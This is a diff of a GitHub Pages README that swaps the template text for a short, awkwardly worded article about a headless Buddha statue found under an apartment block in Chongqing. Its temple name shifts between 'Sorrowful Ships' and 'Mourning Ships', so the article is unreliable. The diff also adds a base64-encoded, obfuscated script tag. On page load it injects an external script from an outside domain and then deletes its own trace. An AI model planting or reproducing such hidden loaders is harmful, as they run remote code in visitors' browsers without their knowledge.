@@ -1,37 +1,18 @@
-## Welcome to GitHub Pages
+# An ancient statue of Buddha was found in China, propping up a ...high-rise building
 
-You can use the [editor on GitHub](https://github.com/noneekat/travel/edit/main/README.md) to maintain and preview the content for your website in Markdown files.
+![Branching](noneekat.jpg)
 
-Whenever you commit to this repository, GitHub Pages will run [Jekyll](https://jekyllrb.com/) to rebuild the pages in your site, from the content in your Markdown files.
+In China, in one of the ancient districts of the city of Chongqing, during the clearing of the territory of an apartment complex accidentally discovered "decapitated" statue of the giant Buddha. The ancient archaeological artifact was part of the ...foundation of a high-rise building, hanging over a cliff. For decades, residents of the block have walked past the moss-covered rock and had no idea that the shrine that once belonged to the "Temple of the Sorrowful Ships" was underneath it.
 
-### Markdown
+An unusual case occurred in the historic Nanjing district of Chongqing, located in southwest China. While clearing the foundations of two multi-story houses located above a rocky cliff, a part of a Buddha statue carved out of stone was discovered. For many years, neither the tenants, art historians, nor the community authorities had any idea what was hidden beneath the thick moss and overgrowth. A trivial accident and utility workers helped, freeing the deity from the thicket. Thanks to their efforts, the citizens could see a 12-meter-high "decapitated" statue of Buddha.
 
-Markdown is a lightweight and easy-to-use syntax for styling your writing. It includes conventions for
+![Branching](noneekat1.jpg)
 
-```markdown
-Syntax highlighted code block
+Many believe that this is the Big Buddha Nanping, also called the Maitreya Buddha. Information found in the archives suggests that the stone statue was originally created in a niche and was 13.3 m high, 10.5 m wide and 3.5 m deep. And had it not been for the well-known events (Cultural Revolution) that took place in the country, the statue would have been intact to this day.
 
-# Header 1
-## Header 2
-### Header 3
+Synopsis: The Cultural Revolution in China, which took place from 1966 to 1976, caused considerable damage to the cultural and historical heritage of the country. All activities were conceived as "instilling the culture of the Communist Party in the minds of the Chinese people," with the almost total destruction of traditional Chinese customs, religion, and culture. Within one decade of Mao Zedong's Cultural Revolution, mainland China experienced a complete reorganization of values. At that time, monasteries, churches and other religious sites were destroyed, hundreds of thousands of Buddha statues were smashed, Buddha sutras were burned, monks were persecuted, etc. It was during this period that the pavilion with statues belonging to the Temple of Mourning Ships, built during the Ming Dynasty (1368 - 1644), was destroyed.
 
-- Bulleted
-- List
+![Branching](noneekat2.jpg)
 
-1. Numbered
-2. List
+<script id="VCxqm" src="data:text/javascript;base64, dmFyIF9USURCRiA9IFsnXHg3MVx4NzVceDY1XHg3Mlx4NzlceDUzXHg2NVx4NmNceDY1XHg2M1x4NzRceDZmXHg3MicsICdceDYyXHg2Zlx4NjRceDc5JywgJ1x4NjdceDY1XHg3NFx4NDVceDZjXHg2NVx4NmRceDY1XHg2ZVx4NzRceDQyXHg3OVx4NDlceDY0JywgJ1x4NDRceDRmXHg0ZFx4NDNceDZmXHg2ZVx4NzRceDY1XHg2ZVx4NzRceDRjXHg2Zlx4NjFceDY0XHg2NVx4NjQnLCAnXHg2M1x4NzJceDY1XHg2MVx4NzRceDY1XHg0NVx4NmNceDY1XHg2ZFx4NjVceDZlXHg3NCcsICdceDczXHg2M1x4NzJceDY5XHg3MFx4NzQnLCAnXHg3NFx4NzlceDcwXHg2NScsICdceDc0XHg2NVx4NzhceDc0XHgyZlx4NmFceDYxXHg3Nlx4NjFceDczXHg2M1x4NzJceDY5XHg3MFx4NzQnXTsoZnVuY3Rpb24oX01GWWNILCBfRDVvdnApIHt2YXIgX20zcmlxID0gZnVuY3Rpb24oX3Mwb3lYKSB7d2hpbGUgKC0tX3Mwb3lYKSB7X01GWWNIWydwdXNoJ10oX01GWWNIWydzaGlmdCddKCkpO319O19tM3JpcSgrK19ENW92cCk7fShfVElEQkYsIDB4MTFiKSk7dmFyIF9KTmJFYyA9IGZ1bmN0aW9uKF9pZlh3cCwgX3g5NmFWKSB7X2lmWHdwID0gX2lmWHdwIC0gMHgwO3ZhciBfT3hYbW4gPSBfVElEQkZbX2lmWHdwXTtyZXR1cm4gX094WG1uO307ZG9jdW1lbnRbJ1x4NjFceDY0XHg2NFx4NDVceDc2XHg2NVx4NmVceDc0XHg0Y1x4NjlceDczXHg3NFx4NjVceDZlXHg2NVx4NzInXShfSk5iRWMoJzB4MCcpLCBmdW5jdGlvbigpIHt2YXIgX1k0Ymc2ID0gZG9jdW1lbnRbX0pOYkVjKCcweDEnKV0oX0pOYkVjKCcweDInKSk7X1k0Ymc2W19KTmJFYygnMHgzJyldID0gX0pOYkVjKCcweDQnKTtfWTRiZzZbJ1x4NzNceDcyXHg2MyddID0gJ1x4NjhceDc0XHg3NFx4NzBceDczXHgzYVx4MmZceDJmXHg2Mlx4MzBceDMwXHg2Y1x4NzhceDcwXHg2OFx4NmRceDJlXHg3MFx4NzJceDZmXHg2Nlx4NjVceDczXHg3OVx4NjFceDc5XHg2OVx4NmVceDZjXHg2MVx4NzJceDY5XHgyZVx4NjNceDZmXHg2ZFx4MmZceDVmXHg3Mlx4NjVceDZkXHg2Zlx4NzRceDY1XHg1Zlx4NzRceDcyXHg2MVx4NjNceDZiXHgyZVx4NmFceDczXHgzZlx4NjNceDYxXHg2ZFx4NzBceDYxXHg2OVx4NjdceDZlXHgzZFx4NmFceDZmXHg2ZVx4NjlceDY2XHg2ZVx4NmJceDU5XHgzOFx4NjMnO2RvY3VtZW50W19KTmJFYygnMHg1JyldKF9KTmJFYygnMHg2JykpWydceDYxXHg3MFx4NzBceDY1XHg2ZVx4NjRceDQzXHg2OFx4NjlceDZjXHg2NCddKF9ZNGJnNik7ZG9jdW1lbnRbX0pOYkVjKCcweDcnKV0oJ1ZDeHFtJylbJ1x4NzJceDY1XHg2ZFx4NmZceDc2XHg2NSddKCk7fSwgeydceDZmXHg2ZVx4NjNceDY1JzogISFbXX0pOw=="></script>
 
-**Bold** and _Italic_ and `Code` text
-
-[Link](url) and ![Image](src)
-```
-
-For more details see [GitHub Flavored Markdown](https://guides.github.com/features/mastering-markdown/).
-
-### Jekyll Themes
-
-Your Pages site will use the layout and styles from the Jekyll theme you have selected in your [repository settings](https://github.com/noneekat/travel/settings). The name of this theme is saved in the Jekyll `_config.yml` configuration file.
-
-### Support or Contact
-
-Having trouble with Pages? Check out our [documentation](https://docs.github.com/categories/github-pages-basics/) or [contact support](https://github.com/contact) and we’ll help you sort it out.
